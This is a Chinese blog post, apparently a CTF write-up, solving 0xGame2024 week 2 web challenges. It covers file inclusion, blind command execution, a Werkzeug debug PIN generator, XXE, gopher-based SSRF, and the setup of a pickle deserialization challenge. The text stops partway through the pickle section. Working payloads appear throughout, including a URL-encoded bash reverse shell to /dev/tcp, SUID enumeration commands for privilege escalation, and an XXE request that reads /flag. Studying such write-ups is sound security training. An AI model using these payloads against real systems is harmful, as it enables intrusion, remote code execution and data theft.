<!DOCTYPE html>
<html lang="zh">
  <head>
    
    <meta charset="UTF-8">
    <title>0xGame2024 week2 - N0tluS.site</title>
    <link rel="shortcut icon" href="/static/img/icon.png">
    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
    
<link rel="stylesheet" href="/static/kico.css">
<link rel="stylesheet" href="/static/hingle.css">

    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta property="og:site_name" content="N0tluS.site">
    <meta property="og:title" content="0xGame2024 week2"/>
    
    <style>body:before{ content: ''; background-image: url(https://api.paugram.com/wallpaper?source=gh) }</style>
    
<meta name="generator" content="Hexo 7.3.0"></head>

  <body>
    <header>
    <div class="head-title">
        <h4>N0tluS.site</h4>
    </div>
    <div class="head-action">
        <div class="toggle-btn"></div>
        <div class="light-btn"></div>
        <div class="search-btn"></div>
    </div>
    <form class="head-search" method="post">
        <input type="text" name="s" placeholder="搜索什么？">
    </form>
    <nav class="head-menu">
        <a href="/">首页</a>
        <div class="has-child">
            <a href>分类</a>
            <div class="sub-menu">
                <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><a class="category-link" href="/categories/wp/">wp</a>
            </div>
        </div>
        
            <a href="/about">关于我</a>
        
    </nav>
</header>

    <main>
    <div class="wrap min">
        <section class="post-title">
            <h2>0xGame2024 week2</h2>
            <div class="post-meta">
                <time class="date">2024.10.24</time>
            
                <span class="category"><a class="category-link" href="/categories/wp/">wp</a></span>
            
            </div>
        </section>
        <article class="post-content">
        
            <h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="hello-include"><a href="#hello-include" class="headerlink" title="hello_include"></a>hello_include</h3><p>提示存在信息泄露，访问index.phps</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: The source code contains important information that must not be disclosed.&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$allowed</span> = [<span class="string">&#x27;hello.php&#x27;</span>, <span class="string">&#x27;phpinfo.php&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1Ie&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1Ie&#x27;</span>], <span class="string">&#x27;php://&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;不允许php://&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_POST</span>[<span class="string">&#x27;f1Ie&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;hello.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>扫目录发现<code>phpinfo.php</code>，发现flag位置在<code>/s3cr3t/f14g </code>，<code>file:///s3cr3t/f14g </code>读文件。这里没大小写通配符，也可以<code>Php://</code>绕过</p>
<h3 id="hello-shell"><a href="#hello-shell" class="headerlink" title="hello_shell"></a>hello_shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>] ?? <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$cmd</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$cmd</span>, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no space allowed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>); <span class="comment">// 没有回显怎么办？ </span></span><br></pre></td></tr></table></figure>

<p><code>cmd=ls%09/|tee%091.txt</code>，读flag发现权限不够，读<code>/readME</code>提示提权</p>
<p>SUID提权命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>空格换成%09<code>find%09/%09-user%09root%09-perm%09-4000%09-print%092&gt;/dev/null|tee%092568.txt</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/wc</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br></pre></td></tr></table></figure>

<p>先反弹shell<code>cmd=bash%09-c%09%22bash%09-i%09%3E%26%09/dev/tcp/ip/port%090%3E%261%22</code></p>
<p>注意到wc命令<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/wc/"><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/wc/">wc | GTFOBins</a></a></p>
<img src="/2024/10/24/0xGame2024-week2/image-20241013172857391.png" class="" title="image-20241013172857391">

<h3 id="baby-pe"><a href="#baby-pe" class="headerlink" title="baby_pe"></a>baby_pe</h3><p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(request.user_agent.string.lower().find(<span class="string">&quot;mozi&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/fileread&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(filename).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>开控制台那肯定想到PIN码rce，读取PIN码需要六个要素</p>
<ul>
<li><p>username</p>
<p>执行命令whoami可以看到，也可以由&#x2F;etc&#x2F;passwd来猜测</p>
</li>
<li><p>modname</p>
<p>一般是flask.app</p>
</li>
<li><p>getattr(app, ‘<strong>name</strong>‘ getattr(app.<strong>class</strong>, ‘<strong>name</strong>‘))</p>
<p>一般是flask</p>
</li>
<li><p>getattr(mod, ‘<strong>file</strong>‘, None)</p>
<p>app.py的绝对路径，可以在debug界面看到</p>
</li>
<li><p>uuid.getnode()</p>
<p>当前电脑mac地址的十进制，一般在<code>/sys/class/net/eth0/address</code>或者<code>/sys/class/net/ens33/address</code>，<code>int((&quot;02:42:c0:a8:e0:02&quot;.replace(&#39;:&#39;,&#39;&#39;)),16)</code></p>
</li>
<li><p>get_machine_id()</p>
<p>读取<code>/etc/machine-id</code>或者<code>/proc/sys/kernel/random/boot_id</code>，docker环境需要读取<code>/proc/self/cgroup</code>最后一个<code>/</code>后面然后拼接</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27; getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.9/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485378416642&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;70d3d850-a8d2-4ff1-a285-34c4a401e57d&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>输入PIN码后，发现权限不够，先反弹shell，然后就是SUID find提权</p>
<img src="/2024/10/24/0xGame2024-week2/image-20241014102217279.png" class="" title="image-20241014102217279">

<h3 id="baby-xxe"><a href="#baby-xxe" class="headerlink" title="baby_xxe"></a>baby_xxe</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/parse&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>():</span><br><span class="line">    xml=request.form.get(<span class="string">&#x27;xml&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(xml)</span><br><span class="line">    <span class="keyword">if</span> xml <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;None&quot;</span></span><br><span class="line">    parser = etree.XMLParser(load_dtd=<span class="literal">True</span>, resolve_entities=<span class="literal">True</span>)</span><br><span class="line">    root = etree.fromstring(xml, parser)</span><br><span class="line">    name=root.find(<span class="string">&#x27;name&#x27;</span>).text</span><br><span class="line">    <span class="keyword">return</span> name <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>简单xxe</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.76.151.192:60088/parse&quot;</span></span><br><span class="line">xml_data = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE xxx[&lt;!ENTITY b SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;xxx&gt;&lt;name&gt;&amp;b;&lt;/name&gt;&lt;/xxx&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">response = requests.post(url, data=&#123;<span class="string">&quot;xml&quot;</span>: xml_data&#125;)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h3 id="baby-ssrf"><a href="#baby-ssrf" class="headerlink" title="baby_ssrf"></a>baby_ssrf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunparse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">BlackList=[</span><br><span class="line">    <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/cmd&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.form.get(<span class="string">&quot;cmd&quot;</span>)).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/visit&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No url provided&quot;</span></span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    realIpAddress = socket.gethostbyname(url.hostname)</span><br><span class="line">    <span class="keyword">if</span> url.scheme == <span class="string">&quot;file&quot;</span> <span class="keyword">or</span> realIpAddress <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker!&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;-L&quot;</span>, urlunparse(url)], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># print(result.stderr)</span></span><br><span class="line">    <span class="keyword">return</span> result.stdout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>先提一下<code>-L</code>这个参数，<code>-L</code>会让http请求跟随服务器的重定向，而curl命令是默认不跟随重定向的</p>
<p>这里127.0.0.1被ban了，可以用<code>sudo.cc</code>这个域名，是解析到127.0.0.1的</p>
<img src="/2024/10/24/0xGame2024-week2/image-20241014161704354.png" class="" title="image-20241014161704354">

<p>这里的难点在于向<code>http://127.0.0.1:8000/cmd</code>发POST包，不太懂怎么用重定向做，所以用gopher协议</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">tcp_body = <span class="string">&quot;&quot;&quot;POST /cmd HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:8000</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Priority: u=0, i</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cmd=env</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tmp = quote_plus(tcp_body)</span><br><span class="line">payload = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://sudo.cc:8000/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+payload</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)       <span class="comment"># 这里因为是GET请求所以要进行两次url编码</span></span><br></pre></td></tr></table></figure>

<img src="/2024/10/24/0xGame2024-week2/image-20241014162346672.png" class="" title="image-20241014162346672">

<h3 id="baby-pickle"><a href="#baby-pickle" class="headerlink" title="baby_pickle"></a>baby_pickle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">UserPool = &#123;&#125;</span><br><span class="line">BlackList = [<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;\x1e&#x27;</span>, <span class="string">b&#x27;system&#x27;</span>, <span class="string">b&#x27;popen&#x27;</span>, <span class="string">b&#x27;os&#x27;</span>, <span class="string">b&#x27;sys&#x27;</span>, <span class="string">b&#x27;posix&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    username = <span class="literal">None</span></span><br><span class="line">    password = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        opcode = b64decode(data)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> BlackList:</span><br><span class="line">            <span class="keyword">if</span> word <span class="keyword">in</span> opcode:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Hacker!&quot;</span></span><br><span class="line">        user = pickle.loads(opcode)</span><br><span class="line">        <span class="built_in">print</span>(user)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;Hello &#123;&#125;&lt;/h1&gt;&quot;</span>.<span class="built_in">format</span>(user.username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> UserPool.keys() <span class="keyword">and</span> password == UserPool[username].password:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;Hello &#123;&#125;&lt;/h1&gt;&quot;</span>.<span class="built_in">format</span>(User.username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> UserPool.keys():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;用户&#123;&#125;已存在&lt;/h1&gt;&quot;</span>.<span class="built_in">format</span>(username)</span><br><span class="line">    UserPool[username] = password</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;注册成功&lt;/h1&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">2333</span>)</span><br></pre></td></tr></table></figure>

<p>不难看出反序列化的回显位是user.username，但是这需要实例化User对象，所以也就得手搓opcode</p>
